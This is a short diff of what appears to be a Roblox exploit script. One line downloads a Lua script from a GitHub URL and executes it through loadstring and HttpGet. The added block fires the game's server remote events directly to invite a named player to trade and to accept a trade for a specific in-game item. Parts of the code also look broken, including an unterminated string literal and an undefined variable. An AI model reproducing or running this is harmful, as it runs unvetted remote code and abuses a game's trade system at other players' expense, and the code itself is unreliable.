@@ -1,6 +1,5 @@
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/novaghoul/Roblox/main/Script/1st.lua"), true))() -- 1st Lua
 
-
 for _,v in pairs(wp) do
     print(k,v)
 end
@@ -65,3 +64,16 @@ wp.ChildAdded:connect(
         end
     end
 )
+
+
+local string_1 = "InviteToTrade";
+local userdata_1 = game:GetService("Workspace").mattpogipogipogipei;
+local Target = game:GetService("ReplicatedStorage").Server;
+Target:FireServer(string_1, userdata_1);
+
+local string_1 = "AcceptTrade";
+local table_1 = {
+	[1] = 'Caribbean Pirate's Cutlass'
+};
+local Target = game:GetService("ReplicatedStorage").Server;
+Target:FireServer(string_1, table_1);
